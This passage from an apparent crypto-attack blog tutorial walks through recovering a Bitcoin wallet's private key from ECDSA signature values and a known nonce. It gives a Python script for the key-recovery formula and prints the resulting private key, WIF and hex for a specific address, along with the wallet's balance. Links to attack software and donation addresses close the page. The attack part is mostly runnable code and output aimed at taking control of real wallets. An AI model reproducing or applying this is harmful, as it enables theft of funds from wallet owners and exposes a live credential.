<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-62-1024x85.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1675"></figure>



<p><code>(0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9 , 0x9d29d467ba4eaea83ab268250f3101b200f66cebbbd0871c2a4c8af9d8730962)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
point2gen  =   (0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9 , 0x9d29d467ba4eaea83ab268250f3101b200f66cebbbd0871c2a4c8af9d8730962)</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2
R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-63.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1676"></figure>



<p><code>PrivKey = 16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
WIF:  KwzKYYfPTrdAZA5m1kxs4WAjSWTuJRnD2ANKHGUugibgFBP4oDSG
HEX:  16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/003-2.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1694"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz">https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/003-addr.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1679"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></a></strong></figcaption></figure></div>


<p><code>BALANCE: $ 657.68</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/dLy74McEFTg" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/dLy74McEFTg</a></strong></p>



<p><a href="https://cryptodeeptech.ru/whitebox-attack" target="_blank" rel="noreferrer noopener"><strong>Source: https://cryptodeeptech.ru/whitebox-attack</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/023-1-1024x576.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1685"></figure></div>



---


---


|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |


